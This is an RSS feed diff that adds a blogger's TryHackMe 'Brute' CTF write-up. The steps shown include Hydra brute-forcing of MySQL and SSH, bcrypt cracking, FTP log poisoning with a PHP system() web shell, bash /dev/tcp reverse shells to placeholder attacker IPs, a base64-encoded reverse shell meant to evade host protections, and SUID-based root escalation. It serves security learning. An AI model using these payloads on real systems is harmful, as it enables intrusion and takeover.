@@ -6,8 +6,318 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 10 Aug 2022 15:32:00 +0000</lastBuildDate>
+        <lastBuildDate>Thu, 22 Sep 2022 11:15:00 +0000</lastBuildDate>
         <atom:link href="https://robscharf.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM: Brute -- Write-Up</title>
+            <link>https://robscharf.github.io/posts/2022/09/thm-brute--write-up/</link>
+            <pubDate>Thu, 22 Sep 2022 11:15:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/09/thm-brute--write-up/</guid>
+            <description>About Brute is a medium rated CTF room on TryHackMe. Rooting this box - which centers around brute-force attacks, as its name implies - involves carrying out a successful dictionary attacks, database enumeration, log poisoning, hash cracking, and cronjob-based privilege escalation.
+Note: I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
+Enumeration nmap 21/tcp open ftp syn-ack ttl 61 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 61 OpenSSH 8.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p>Brute is a <em>medium</em> rated CTF room on <a href="https://tryhackme.com/room/ettubrute">TryHackMe</a>. Rooting this box - which centers around brute-force attacks, as its name implies - involves carrying out a successful dictionary attacks, database enumeration, log poisoning, hash cracking, and cronjob-based privilege escalation.</p>
+<p><strong>Note:</strong> I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>21/tcp   open  ftp     syn-ack ttl 61 vsftpd 3.0.3
+
+22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+
+3306/tcp open  mysql   syn-ack ttl 61 MySQL 8.0.28-0ubuntu0.20.04.3
+
+[*] Identified service nl-voice on tcp/1259 on &lt;target-ip&gt;
+</code></pre><p>Our initial nmap efforts reveal standard <code>vsftp</code>(port 21) and <code>OpenSSH</code> (port 22), and MySQL (port 3306) services running on the box. Additionally, our scans picked up activity on port 1259, which was tagged as <code>nl-voice</code>. This may be worth returning to later, if we need additional leads.</p>
+<h3 id="mysql---port-3306">MySQL - Port 3306</h3>
+<p><code>http://&lt;target-ip&gt;:3306/</code></p>
+<pre tabindex="0"><code>[���
+8.0.28-0ubuntu0.20.04.3�Ñ:��{Q;  nLG�ÿÿÿ �ÿß ����������uqZW
+O6[]707�caching_sha2_password�!�� ÿ„ #08S01Got packets out of order
+</code></pre><p>Visiting the MySQL server port in our browser returns the above. This intial enumeration could also have been achieved via tools like netcat. We note that the contents of the  message displayed match nmap&rsquo;s service version identification of <code>MySQL 8.0.28-0ubuntu0.20.04.3</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>While we haven&rsquo;t come across any immediate evidence to confirm this, our CTF experience and instincts tell us that it will be worth our while to attempt logging in with default and/or commonly used credentials. <a href="https://dev.mysql.com/doc/refman/8.0/en/default-privileges.html">MySQL&rsquo;s default user configuration</a> uses <code>root</code> as the username, with no password. While we aren&rsquo;t quite <em>that</em> lucky, our initial brute-force efforts yield the correct password.</p>
+<h3 id="hydra">Hydra</h3>
+<p><code>hydra -f -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt &lt;target-ip&gt;mysql</code></p>
+<pre tabindex="0"><code>$ hydra -f -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt &lt;target-ip&gt;mysql | sudo tee hydra-mysql.txt
+Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-03 13:01:07
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking mysql://10.10.46.5:3306/
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;123456&#34; - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;12345&#34; - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;123456789&#34; - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;password&#34; - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;iloveyou&#34; - 5 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;princess&#34; - 6 of 14344399 [child 0] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;1234567&#34; - 7 of 14344399 [child 2] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;r-----u&#34; - 8 of 14344399 [child 3] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;12345678&#34; - 9 of 14344399 [child 1] (0/0)
+[ATTEMPT] target &lt;target-ip&gt;- login &#34;root&#34; - pass &#34;abc123&#34; - 10 of 14344399 [child 0] (0/0)
+[3306][mysql] host: &lt;target-ip&gt;👍  login: root   password: r-----u👍
+[STATUS] attack finished for &lt;target-ip&gt;(valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-03 13:01:10
+</code></pre><h2 id="enumeration---mysql">Enumeration - MySQL</h2>
+<p>Now that we have valid credentials for accessing the MySQL database, let&rsquo;s see what we can find&hellip;</p>
+<h3 id="mysql">MySQL</h3>
+<p><code>mysql -h &lt;target-ip&gt;-u root -p </code></p>
+<pre tabindex="0"><code>$ mysql -h &lt;target-ip&gt;-u root -p
+Enter password: r-----u
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 31
+Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+
+MySQL [(none)]&gt; 
+</code></pre><pre tabindex="0"><code>MySQL [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| website            |
++--------------------+
+5 rows in set (0.098 sec)
+</code></pre><p><code>use website;</code></p>
+<pre tabindex="0"><code>MySQL [(none)]&gt; use website;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</code></pre><p><code>show tables;</code></p>
+<pre tabindex="0"><code>MySQL [website]&gt; show tables;
++-------------------+
+| Tables_in_website |
++-------------------+
+| users             |
++-------------------+
+1 row in set (0.090 sec)
+</code></pre><p><code>select * from users;</code></p>
+<pre tabindex="0"><code>
+
+MySQL [website]&gt; select * from users;
++----+----------+--------------------------------------------------------------+---------------------+
+| id | username | password                                                     | created_at          |
++----+----------+--------------------------------------------------------------+---------------------+
+|  1 | adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
++----+----------+--------------------------------------------------------------+---------------------+
+1 row in set (0.096 sec)
+</code></pre><p>Excellent! We&rsquo;ve found some user credentials, including a hashed password -<code>adrian:$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we</code>. Let&rsquo;s try to crack it with John the Ripper.</p>
+<h3 id="john-the-ripper">John the Ripper</h3>
+<pre tabindex="0"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt adrian_hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+👍t----r           (?)     👍
+1g 0:00:00:00 DONE (2022-08-03 13:06) 4.166g/s 150.0p/s 150.0c/s 150.0C/s 123456..jordan
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre><p>Our friend John made short work of this, despite Blowfish being a relatively uncommon cipher (having been largely eclipsed by AES - more information <a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)">here</a>.)</p>
+<p><code>adrian:t----r</code></p>
+<h3 id="web-login">Web login</h3>
+<p>After logging in to the homepage with our discovered credentials&hellip;</p>
+<p><code>http://10.10.46.5/welcome.php</code>
+<img src="/images/brutus/brutus-welcome.png" alt=""></p>
+<p>We are greeted by this page. The <code>log</code> button gives us convenient access to a service log right on the page. After some brief consideration, we identify this log as being produced by the FTP server running on port 21 of the box. Our initial attempts at enumeration/access have already populated the log!</p>
+<p><code>view-source:http://&lt;target-ip&gt;/welcome.php</code></p>
+<pre tabindex="0"><code> 
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;en&#34;&gt;
+&lt;head&gt;
+    &lt;meta charset=&#34;UTF-8&#34;&gt;
+    &lt;title&gt;Welcome&lt;/title&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;&gt;
+    &lt;style&gt;
+        body{ font: 14px sans-serif; text-align: center; }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1 class=&#34;my-5&#34;&gt;Welcome back adrian, Your log file is ready for viewing.&lt;/h1&gt;
+    Wed Aug  3 17:11:34 2022 [pid 1426] CONNECT: Client &#34;::ffff:&lt;attacker-ip&gt;&#34;
+Wed Aug  3 17:11:38 2022 [pid 1425] [virtualtack] FAIL LOGIN: Client &#34;::ffff:&lt;attacker-ip&gt;&#34;
+Wed Aug  3 17:11:46 2022 [pid 1466] CONNECT: Client &#34;::ffff:&lt;attacker-ip&gt;&#34;
+Wed Aug  3 17:11:53 2022 [pid 1465] [adrian] FAIL LOGIN: Client &#34;::ffff:&lt;attacker-ip&gt;&#34;
+&lt;br&gt;    &lt;br&gt; 
+    &lt;form action=&#34;&#34; method=&#34;post&#34;&gt;
+        &lt;input type=&#34;submit&#34; name=&#34;log&#34; value=&#34;Log&#34;&gt;	
+    &lt;/form&gt;
+    &lt;br&gt;
+    &lt;p&gt; 
+        &lt;a href=&#34;logout.php&#34; class=&#34;btn btn-danger ml-3&#34;&gt;Sign Out of Your Account&lt;/a&gt;
+    &lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>My first instinct here is to try some log poisioning. Here are the steps that I used to successfully realize the attack:</p>
+<p><strong>1.Capture the log request using Burp Suite</strong>
+<img src="/images/brute/burprepeater.png" alt=""></p>
+<p><strong>2. Inject PHP system request code</strong>
+We can do this easily via log-in attempts, simply replacing our username in the request with a PHP system request (<code>&lt;?php echo system($_REQUEST['loljection']); ?&gt;</code>).</p>
+<pre tabindex="0"><code>$ ftp &lt;target-ip&gt;
+Connected to &lt;target-ip&gt;.
+220 (vsFTPd 3.0.3)
+Name (&lt;target-ip&gt;:virtualtack): beep boop &lt;?php echo system($_REQUEST[&#39;loljection&#39;]); ?&gt; beep boop
+331 Please specify the password.
+Password:
+530 Login incorrect.
+ftp: Login failed
+ftp&gt; exit
+221 Goodbye.
+</code></pre><p>This will create a new entry in the log, allowing us to make an HTTP request via Burp with a system command in the format of <code>loljection=&lt;command&gt;</code>. The output of our command arguments can then be viewed:</p>
+<p><img src="/images/brute/rcewin.png" alt=""></p>
+<h2 id="foothold">Foothold</h2>
+<p>Now that we have a PoC of the log poisoning vector, we can set up our netcat listener - <code>nc -lvnp &lt;port&gt;</code> - and execute our remote shell command (<code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1' </code>) via HTTP request.</p>
+<pre tabindex="0"><code>✂️ ................................ ✂️
+
+log=Log&amp;loljection=bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#39; 
+</code></pre><p>❗<strong>Note:</strong> Before sending this request via Burp, we need to <code>URL Encode</code> it by highlighting the bash command and pressing  <code>CTRL+U</code>.</p>
+<p>&hellip;and we get a reverse shell for our efforts.</p>
+<pre tabindex="0"><code>$ sudo nc -l 9002
+bash: cannot set terminal process group (784): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@brute:/var/www/html$ whoami
+whoami
+www-data
+www-data@brute:/var/www/html$
+</code></pre><p>This gives us access to the machine as the <code>www-data</code> account. After a moment spent upgrading our shell, we can move on.</p>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>Now that we have remote access, let&rsquo;s take a look around&hellip;</p>
+<p>Since our on-ramp was a web app, let&rsquo;s check out <code>/var/www/</code>&hellip;</p>
+<p><code>config.php</code></p>
+<pre tabindex="0"><code>&lt;?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user &#39;root&#39; with no password) */
+define(&#39;DB_SERVER&#39;, &#39;localhost&#39;);
+define(&#39;DB_USERNAME&#39;, &#39;adrian&#39;);
+define(&#39;DB_PASSWORD&#39;, &#39;P@sswr0d789!&#39;);
+define(&#39;DB_NAME&#39;, &#39;website&#39;);
+
+/* Attempt to connect to MySQL database */
+$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+
+// Check connection
+if($mysqli === false){
+    die(&#34;ERROR: Could not connect. &#34; . $mysqli-&gt;connect_error);
+}
+?&gt;
+</code></pre><p>Unfortunately the credentials here don&rsquo;t appear to be reused elsewhere, which I hoped would give us access to <code>adrian</code>&rsquo;s user account on the machine. However, if we need an additional escalation vector later, these MySQL database credentials may be useful. For now, though, let&rsquo;s move on to the <code>/home/</code> directory.</p>
+<p><code>/home/adrian/.reminder</code></p>
+<pre tabindex="0"><code>www-data@brute:/home/adrian$ cat .reminder
+
+Rules:
+best of 64
++ exclamation
+
+ettubrute
+</code></pre><p>Luckily we have access to <code>adrian</code>&rsquo;s home folder as <code>www-user</code>. Inside, we find a hidden file called <code>.reminder</code> with some hints on how to proceed.</p>
+<h2 id="privesc">PrivEsc</h2>
+<h3 id="as-user-www-data">As user <code>www-data</code>&hellip;</h3>
+<p>When searching the internet for &ldquo;rules AND best of 64&rdquo;, the first result points to <code>best64.rule</code> on the Hashcat GitHub repository. I happen to be more familiar with John the Ripper to create custom wordlists, so I&rsquo;ll be using that instead. We will create a new wordlist, using the <code>best of 64</code> rule in conjuction with our password hint <code>ettubrute</code>.</p>
+<p><strong>Create &lsquo;Best of 64&rsquo; password list with John</strong></p>
+<pre tabindex="0"><code>john --rules=best64 --wordlist=password.txt --stdout &gt; wordlist.txt
+</code></pre><p>Now we have <code>wordlist.txt</code>, which uses our <code>best of 64</code> rule to mangle <code>ettubrute</code>, but we need to account for the <code>+ exclamation</code> line of our hint. While we could manually add a <code>!</code> to the end of each entry in our list, we can do it properly with the <code>sed</code> command <a href="https://stackoverflow.com/questions/15978504/add-text-at-the-end-of-each-line">for the sake of learning</a>.</p>
+<p><strong>Add <code>!</code> to end of wordlist entries</strong></p>
+<pre tabindex="0"><code>sed -i &#39;s/$/!/&#39; wordlist.txt
+</code></pre><p>Now our wordlist accounts for both hints. It looks like:</p>
+<pre tabindex="0"><code>$ cat wordlist.txt
+ettubrute!
+eturbutte!
+ETTUBRUTE!
+Ettubrute!
+ettubrute0!
+ettubrute1!
+ettubrute2!
+ettubrute3!
+✂️ ................................ ✂️
+</code></pre><p>Now we should be able use this wordlist to crack the SSH password of the <code>adrian</code> user via Hydra.</p>
+<pre tabindex="0"><code>hydra -f -V -l adrian -P wordlist.txt -e nsr -s 22 ssh://&lt;target-ip&gt;
+</code></pre><pre tabindex="0"><code>Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 16:28:40
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 78 login tries (l:1/p:78), ~5 tries per task
+[DATA] attacking ssh://&lt;target-ip&gt;:22/
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;adrian&#34; - pass &#34;adrian&#34; - 1 of 78 [child 0] (0/0)
+✂️ ................................ ✂️
+[ATTEMPT] target &lt;target-ip&gt; - login &#34;adrian&#34; - pass &#34;t-----------!&#34; - 45 of 80 [child 1] (0/2)
+[22][ssh] host: &lt;target-ip&gt;   login: adrian   password: t-----------!
+[STATUS] attack finished for &lt;target-ip&gt; (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 16:28:50
+</code></pre><p>Excelllent. We now have valid user account credentials for SSH access:
+<code>adrian:t-----------!</code></p>
+<h3 id="as-user-adrian">As user <code>adrian</code>&hellip;</h3>
+<p>Exploring the user&rsquo;s home directory, we come across another hint, as well as two bash script (<code>.sh</code>) files.</p>
+<p><code>~/ftp/files/.notes</code></p>
+<pre tabindex="0"><code>That silly admin
+He is such a micro manager, wants me to check in every minute by writing on my punch card.
+
+He even asked me to write the script for him.
+
+Little does he know, I am planning my revenge.
+</code></pre><p><code>~/ftp/files/script</code></p>
+<pre tabindex="0"><code>#!/bin/sh
+while read line;
+do
+  /usr/bin/sh -c &#34;echo $line&#34;;
+done &lt; /home/adrian/punch_in
+</code></pre><p><code>~/punch_in.sh</code></p>
+<pre tabindex="0"><code>#!/bin/bash
+
+/usr/bin/echo &#39;Punched in at &#39;$(/usr/bin/date +&#34;%H:%M&#34;) &gt;&gt; /home/adrian/punch_in
+</code></pre><p>Looking for a quick win, I began adding reverse shell code to various locations in the script file(s). This yielded very little, though I was able to initiate a reverse shell callback as the <code>adrian</code> user via <code>~/ftp/files/script</code>. From this, we know that our attacking machine is reachable, and that there are no prohibitive antivirus to account for.</p>
+<p>From the <code>.notes</code> hint, we know/can assume that <code>punch_in.sh</code> is being run by the <code>root</code> user (e.g., the author&rsquo;s boss). If this is true, the script is pulling each line from <code>punch_in</code>, and running the line as a shell command (<code>/usr/bin/sh -c &lt;line-here&gt;</code>).</p>
+<p>Thus, if my hypothesis is correct, we can effectively run commands as <code>root</code> by passing them into the scheduled <code>punch_in.sh</code> via <code>punch_in</code>. This means that we have a few routes to <code>root</code> (🙃). I highlight two below:</p>
+<h3 id="method-1---setting-the-suid-bit">Method 1 - Setting the SUID Bit</h3>
+<p>The easiest and most direct route to <code>root</code> escalation is by adding the SUID bit to the machine&rsquo;s <code>bash</code> binary, allowing it to be run by all users with elevated permissions.</p>
+<p>This can be done by adding a line containing <code>`chmod +s /bin/bash`</code> to <code>punch_in</code>. When the <code>punch_in.sh</code> script runs and ingests our command to execute, we will gain the ability to run <code>bash</code> as <code>root</code>.</p>
+<p>❗<strong>Note:</strong> Commands placed in <code>punch_in</code> must be wrapped in backticks (<code>` `</code>) for the script to interpret it correctly.</p>
+<p>As shown on <a href="https://gtfobins.github.io/gtfobins/bash/">GTFOBins</a>, with the SUID bit set, <code>bash</code> simply needs to be run with the <code>-p</code> flag to invoke/preserve elevated permissions.</p>
+<pre tabindex="0"><code>adrian@brute:~$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt
+THM{C-------------------------3}
+</code></pre><h3 id="method-2---reverse-shell">Method 2 - Reverse Shell</h3>
+<p>Alternatively, we can spawn a reverse shell on our attacking machine by injecting the relevant reverse shell code. I chose to use a base64 encoded command, as it can potentially sidestep host-based protections and other pitfalls with little intial time investment.</p>
+<p><strong>Bash reverse shell</strong></p>
+<pre tabindex="0"><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/9111 0&gt;&amp;1
+</code></pre><p><strong>Base64 encoded/decoded bash reverse shell</strong></p>
+<pre tabindex="0"><code>`echo &#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL215dGhtaXAvOTExMSAwPiYx+JjE=&#34; | base64 -d | bash`
+</code></pre><pre tabindex="0"><code>$ nc -lvnp 9111
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::9111
+Ncat: Listening on 0.0.0.0:9111
+Ncat: Connection from &lt;target-ip&gt;.
+Ncat: Connection from &lt;target-ip&gt;:59158.
+bash: cannot set terminal process group (3423): Inappropriate ioctl for device
+bash: no job control in this shell
+root@brute:~# whoami
+whoami
+root
+root@brute:~# cat /root/root.txt
+cat /root/root.txt
+THM{C-------------------------3}
+</code></pre><h2 id="lessons-learned">Lessons Learned</h2>
+<p>This was a really enjoyable box, with several opportunities to practice and refine my methodology.</p>
+<ul>
+<li><strong>FTP log poisoning</strong> - while we didn&rsquo;t have to hunt down a service log file via LFI or another web-app-based vector, this box helped me to expand my understanding and methodology. This was one of the first log poisoning vectors I have encountered related to an FTP service, instead of Apache, as is frequently the case.</li>
+<li><strong>Password mangling with Rules (John)</strong> - this box provided a great refresher on the generation of (password) wordlists via Hashcat/John/etc. rulesets.</li>
+<li><strong>Encoding</strong> and <strong>&ldquo;best practices&rdquo;</strong> - After completing the box, I went back to check if the reverse shell code would execute absent base64 encoding. I couldn&rsquo;t get it to. Thus, this box provided solid reinforcement of best practices in my developing methodology, as encoding the code &ldquo;cost&rdquo; me little (in terms of time) but yielded a successful privilege escalation.</li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>THM: Daily Bugle -- Write-Up</title>
